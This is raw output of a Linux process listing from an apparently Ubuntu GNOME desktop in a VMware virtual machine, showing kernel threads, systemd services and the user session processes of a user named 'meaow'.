F S UID          PID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
1 I root          29       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/1:0H-events_highpri]
1 S root          30       2  0  80   0 -     0 smpboo 19:43 ?        00:00:00 [cpuhp/2]
1 S root          31       2  0   9   - -     0 smpboo 19:43 ?        00:00:00 [idle_inject/2]
1 S root          32       2  0 -40   - -     0 smpboo 19:43 ?        00:00:00 [migration/2]
1 S root          33       2  0  80   0 -     0 smpboo 19:43 ?        00:00:00 [ksoftirqd/2]
1 I root          34       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/2:0-events]
1 I root          35       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/2:0H-kblockd]
1 S root          36       2  0  80   0 -     0 smpboo 19:43 ?        00:00:00 [cpuhp/3]
1 S root          37       2  0   9   - -     0 smpboo 19:43 ?        00:00:00 [idle_inject/3]
1 S root          38       2  0 -40   - -     0 smpboo 19:43 ?        00:00:00 [migration/3]
1 S root          39       2  0  80   0 -     0 smpboo 19:43 ?        00:00:00 [ksoftirqd/3]
1 I root          40       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/3:0-cgroup_destroy]
1 I root          41       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/3:0H-events_highpri]
1 I root          42       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u513:0-flush-8:0]
1 I root          43       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u514:0-flush-8:0]
1 I root          44       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u515:0-flush-8:0]
5 S root          46       2  0  80   0 -     0 devtmp 19:43 ?        00:00:00 [kdevtmpfs]
1 I root          47       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-inet_frag_wq]
1 S root          48       2  0  80   0 -     0 kaudit 19:43 ?        00:00:00 [kauditd]
1 S root          49       2  0  80   0 -     0 watchd 19:43 ?        00:00:00 [khungtaskd]
1 S root          50       2  0  80   0 -     0 oom_re 19:43 ?        00:00:00 [oom_reaper]
1 I root          52       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u513:2-ext4-rsv-conversion]
1 I root          53       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-writeback]
1 S root          54       2  0  80   0 -     0 kcompa 19:43 ?        00:00:00 [kcompactd0]
1 S root          55       2  0  85   5 -     0 ksm_sc 19:43 ?        00:00:00 [ksmd]
1 S root          56       2  0  99  19 -     0 khugep 19:43 ?        00:00:00 [khugepaged]
1 I root          57       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-kintegrityd]
1 I root          58       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-kblockd]
1 I root          59       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-blkcg_punt_bio]
1 S root          60       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/9-acpi]
1 I root          61       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/3:1-events]
1 I root          62       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-tpm_dev_wq]
1 I root          63       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-ata_sff]
1 I root          64       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-md]
1 I root          65       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-md_bitmap]
1 I root          66       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-edac-poller]
1 I root          67       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-devfreq_wq]
1 S root          68       2  0   9   - -     0 kthrea 19:43 ?        00:00:00 [watchdogd]
1 I root          71       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/3:1H-kblockd]
1 S root          72       2  0  80   0 -     0 kswapd 19:43 ?        00:00:00 [kswapd0]
1 S root          73       2  0  80   0 -     0 ecrypt 19:43 ?        00:00:00 [ecryptfs-kthread]
1 I root          74       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-kthrotld]
1 S root          75       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/24-pciehp]
1 S root          76       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/25-pciehp]
1 S root          77       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/26-pciehp]
1 S root          78       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/27-pciehp]
1 S root          79       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/28-pciehp]
1 S root          80       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/29-pciehp]
1 S root          81       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/30-pciehp]
1 S root          82       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/31-pciehp]
1 S root          83       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/32-pciehp]
1 S root          84       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/33-pciehp]
1 S root          85       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/34-pciehp]
1 S root          86       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/35-pciehp]
1 S root          87       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/36-pciehp]
1 S root          88       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/37-pciehp]
1 S root          89       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/38-pciehp]
1 S root          90       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/39-pciehp]
1 S root          91       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/40-pciehp]
1 S root          92       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/41-pciehp]
1 S root          93       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/42-pciehp]
1 S root          94       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/43-pciehp]
1 S root          95       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/44-pciehp]
1 S root          96       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/45-pciehp]
1 S root          97       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/46-pciehp]
1 S root          98       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/47-pciehp]
1 S root          99       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/48-pciehp]
1 S root         100       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/49-pciehp]
1 S root         101       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/50-pciehp]
1 S root         102       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/51-pciehp]
1 S root         103       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/52-pciehp]
1 S root         104       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/53-pciehp]
1 S root         105       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/54-pciehp]
1 S root         106       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/55-pciehp]
1 I root         107       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/1:1-events]
1 I root         108       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-acpi_thermal_pm]
1 I root         109       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u514:1-events_power_efficient]
1 S root         110       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_0]
1 I root         111       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_0]
1 S root         112       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_1]
1 I root         113       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_1]
1 I root         115       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u514:3-events_unbound]
1 I root         116       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-mld]
1 I root         117       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-ipv6_addrconf]
1 I root         118       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/1:1H-kblockd]
1 I root         119       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u512:1-ipv6_addrconf]
1 I root         126       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u514:4-flush-8:0]
1 I root         129       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-kstrp]
1 I root         131       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/u517:0]
1 I root         133       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/u519:0-ttm]
1 I root         134       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/u520:0-ttm]
1 I root         135       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/u521:0-ttm]
1 I root         148       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-charger_manager]
1 I root         172       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/2:1H-kblockd]
1 I root         175       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/0:1H-kblockd]
1 I root         202       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/1:2-cgroup_destroy]
1 I root         203       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-mpt_poll_0]
1 I root         204       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-mpt/0]
1 I root         205       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u515:1-events_unbound]
1 S root         216       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_2]
1 I root         217       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_2]
1 S root         220       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_3]
1 I root         221       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_3]
1 S root         222       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_4]
1 I root         223       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_4]
1 S root         224       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_5]
1 I root         225       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_5]
1 S root         226       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_6]
1 I root         227       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_6]
1 S root         228       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_7]
1 I root         229       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_7]
1 S root         230       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_8]
1 I root         231       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_8]
1 S root         232       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_9]
1 I root         233       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_9]
1 S root         234       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_10]
1 I root         235       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_10]
1 S root         236       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_11]
1 I root         237       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_11]
1 S root         238       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_12]
1 I root         239       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_12]
1 S root         240       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_13]
1 I root         241       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_13]
1 S root         242       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_14]
1 I root         243       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_14]
1 S root         244       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_15]
1 I root         245       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_15]
1 S root         246       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_16]
1 I root         247       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_16]
1 S root         248       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_17]
1 I root         249       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_17]
1 S root         250       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_18]
1 I root         251       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_18]
1 S root         252       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_19]
1 I root         253       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_19]
1 S root         254       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_20]
1 I root         255       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_20]
1 S root         256       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_21]
1 I root         257       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_21]
1 S root         258       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_22]
1 I root         259       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_22]
1 S root         260       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_23]
1 I root         261       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_23]
1 S root         262       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_24]
1 I root         263       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_24]
1 S root         264       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_25]
1 I root         265       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_25]
1 S root         266       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_26]
1 I root         267       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_26]
1 S root         268       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_27]
1 I root         269       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_27]
1 S root         270       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_28]
1 I root         271       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_28]
1 S root         272       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_29]
1 I root         273       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_29]
1 S root         274       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_30]
1 I root         275       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_30]
1 S root         276       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_31]
1 I root         277       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_31]
1 S root         278       2  0  80   0 -     0 scsi_e 19:43 ?        00:00:00 [scsi_eh_32]
1 I root         279       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-scsi_tmf_32]
1 I root         303       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u516:26-flush-8:0]
1 I root         304       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u516:27-events_freezable_pwr_efficient]
1 I root         315       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u515:2-flush-8:0]
1 S root         354       2  0  80   0 -     0 kjourn 19:43 ?        00:00:00 [jbd2/sda2-8]
1 I root         355       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-ext4-rsv-conversion]
4 S root         403       1  0  79  -1 - 16811 ep_pol 19:43 ?        00:00:00 /usr/lib/systemd/systemd-journald
1 I root         425       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u513:3-events_freezable_pwr_efficient]
1 I root         426       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u513:4-flush-8:0]
1 I root         431       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/0:2-cgroup_destroy]
1 I root         438       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/2:2-cgroup_destroy]
4 S root         457       1  0  80   0 -  8045 ep_pol 19:43 ?        00:00:00 /usr/lib/systemd/systemd-udevd
1 S root         526       2  0  58   - -     0 psi_rt 19:43 ?        00:00:00 [psimon]
1 I root         571       2  0  80   0 -     0 worker 19:43 ?        00:00:00 [kworker/u515:4-events_unbound]
4 S systemd+     573       1  0  80   0 -  4390 ep_pol 19:43 ?        00:00:00 /usr/lib/systemd/systemd-oomd
4 S systemd+     578       1  0  80   0 -  5428 ep_pol 19:43 ?        00:00:00 /usr/lib/systemd/systemd-resolved
4 S systemd+     580       1  0  80   0 - 22762 ep_pol 19:43 ?        00:00:00 /usr/lib/systemd/systemd-timesyncd
1 S root         697       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/57-vmw_vmci]
1 S root         698       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/58-vmw_vmci]
1 S root         699       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/59-vmw_vmci]
1 S root         701       2  0   9   - -     0 irq_th 19:43 ?        00:00:00 [irq/16-vmwgfx]
1 I root         702       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-ttm]
1 I root         760       2  0  60 -20 -     0 rescue 19:43 ?        00:00:00 [kworker/R-cryptd]
4 S avahi        997       1  0  80   0 -  2167 do_pol 19:43 ?        00:00:00 avahi-daemon: running [meaow.local]
4 S message+     998       1  0  80   0 -  3052 ep_pol 19:43 ?        00:00:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
4 S gnome-r+    1002       1  0  80   0 - 128202 do_pol 19:43 ?       00:00:00 /usr/libexec/gnome-remote-desktop-daemon --system
4 S polkitd     1017       1  0  80   0 - 97741 do_pol 19:43 ?        00:00:00 /usr/lib/polkit-1/polkitd --no-debug
4 S root        1023       1  0  80   0 - 78344 do_pol 19:43 ?        00:00:00 /usr/libexec/power-profiles-daemon
4 S root        1032       1  0  80   0 - 499399 futex_ 19:43 ?       00:00:01 /usr/lib/snapd/snapd
4 S root        1036       1  0  80   0 - 78323 do_pol 19:43 ?        00:00:00 /usr/libexec/accounts-daemon
4 S root        1037       1  0  80   0 -  2356 hrtime 19:43 ?        00:00:00 /usr/sbin/cron -f -P
4 S root        1040       1  0  80   0 - 77430 do_pol 19:43 ?        00:00:00 /usr/libexec/switcheroo-control
4 S root        1059       1  0  80   0 -  4541 ep_pol 19:43 ?        00:00:00 /usr/lib/systemd/systemd-logind
4 S root        1065       1  0  80   0 - 135807 do_pol 19:43 ?       00:00:00 /usr/libexec/udisks2/udisksd
1 S avahi       1103     997  0  80   0 -  2120 unix_s 19:43 ?        00:00:00 avahi-daemon: chroot helper
4 S syslog      1106       1  0  80   0 - 55641 do_sel 19:43 ?        00:00:00 /usr/sbin/rsyslogd -n -iNONE
4 S root        1109       1  0  80   0 - 84092 do_pol 19:43 ?        00:00:00 /usr/sbin/NetworkManager --no-daemon
4 S root        1111       1  0  80   0 -  4345 do_sel 19:43 ?        00:00:00 /usr/sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
4 S root        1161       1  0  80   0 - 98023 do_pol 19:43 ?        00:00:00 /usr/sbin/ModemManager
4 S root        1271       1  0  80   0 -  9559 ep_pol 19:43 ?        00:00:00 /usr/sbin/cupsd -l
4 S root        1274       1  0  80   0 - 28066 do_pol 19:43 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
4 S root        1291       1  0  80   0 - 78706 do_pol 19:43 ?        00:00:00 /usr/sbin/gdm3
4 S cups-br+    1305       1  0  80   0 - 67087 do_pol 19:43 ?        00:00:00 /usr/sbin/cups-browsed
1 S kernoops    1307       1  0  80   0 -  3186 do_pol 19:43 ?        00:00:00 /usr/sbin/kerneloops --test
1 S root        1309       2  0  58   - -     0 psi_rt 19:43 ?        00:00:00 [psimon]
1 S kernoops    1311       1  0  80   0 -  3186 do_pol 19:43 ?        00:00:00 /usr/sbin/kerneloops
4 S rtkit       1399       1  0  81   1 -  5735 do_pol 19:43 ?        00:00:00 /usr/libexec/rtkit-daemon
1 I root        1506       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/u520:2-ttm]
4 S colord      1521       1  0  80   0 - 80019 do_pol 19:43 ?        00:00:00 /usr/libexec/colord
4 S root        1572       1  0  80   0 - 79173 do_pol 19:43 ?        00:00:00 /usr/libexec/upowerd
4 S root        1908    1291  0  80   0 - 60649 do_pol 19:43 ?        00:00:00 gdm-session-worker [pam/gdm-password]
4 S meaow       1921       1  0  80   0 -  5286 ep_pol 19:43 ?        00:00:00 /usr/lib/systemd/systemd --user
5 S meaow       1928    1921  0  80   0 -  5365 do_sig 19:43 ?        00:00:00 (sd-pam)
0 S meaow       1937    1921  0  69 -11 - 28959 ep_pol 19:43 ?        00:00:03 /usr/bin/pipewire
0 S meaow       1938    1921  0  80   0 - 24434 ep_pol 19:43 ?        00:00:00 /usr/bin/pipewire -c filter-chain.conf
0 S meaow       1945    1921  0  69 -11 - 101697 do_pol 19:43 ?       00:00:00 /usr/bin/wireplumber
0 S meaow       1951    1921  0  69 -11 - 30170 ep_pol 19:43 ?        00:00:00 /usr/bin/pipewire-pulse
0 S meaow       1959    1921  0  80   0 - 79127 do_pol 19:43 ?        00:00:00 /usr/bin/gnome-keyring-daemon --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring
0 S meaow       1965    1921  0  80   0 -  2741 ep_pol 19:43 ?        00:00:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
0 S meaow       2005    1921  0  80   0 - 171006 do_pol 19:43 ?       00:00:00 /usr/libexec/xdg-document-portal
0 S meaow       2009    1921  0  80   0 - 77327 do_pol 19:43 ?        00:00:00 /usr/libexec/xdg-permission-store
4 S root        2016    2005  0  80   0 -   676 unix_s 19:43 ?        00:00:00 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc
4 S meaow       2039    1908  0  80   0 - 58917 do_pol 19:43 tty2     00:00:00 /usr/libexec/gdm-wayland-session env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
0 S meaow       2044    2039  0  80   0 - 74559 do_pol 19:43 tty2     00:00:00 /usr/libexec/gnome-session-binary --session=ubuntu
0 S meaow       2106    1921  0  80   0 - 40663 do_pol 19:43 ?        00:00:00 /usr/libexec/gcr-ssh-agent --base-dir /run/user/1000/gcr
0 S meaow       2107    1921  0  80   0 - 22887 do_pol 19:43 ?        00:00:00 /usr/libexec/gnome-session-ctl --monitor
0 S meaow       2121    1921  0  80   0 - 78571 do_pol 19:43 ?        00:00:00 /usr/libexec/gvfsd
0 S meaow       2129    1921  0  80   0 - 133618 futex_ 19:43 ?       00:00:00 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f
0 S meaow       2131    1921  0  80   0 - 166988 do_pol 19:43 ?       00:00:00 /usr/libexec/gnome-session-binary --systemd-service --session=ubuntu
0 S meaow       2169    1921  2  80   0 - 1135790 do_pol 19:43 ?      00:00:19 /usr/bin/gnome-shell
0 S meaow       2172    2131  0  80   0 - 95734 do_pol 19:43 ?        00:00:00 /usr/libexec/at-spi-bus-launcher --launch-immediately
0 S meaow       2182    2172  0  80   0 -  2370 ep_pol 19:43 ?        00:00:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11 --address=unix:path=/run/user/1000/at-spi/bus
1 I root        2220       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/u519:2-ttm]
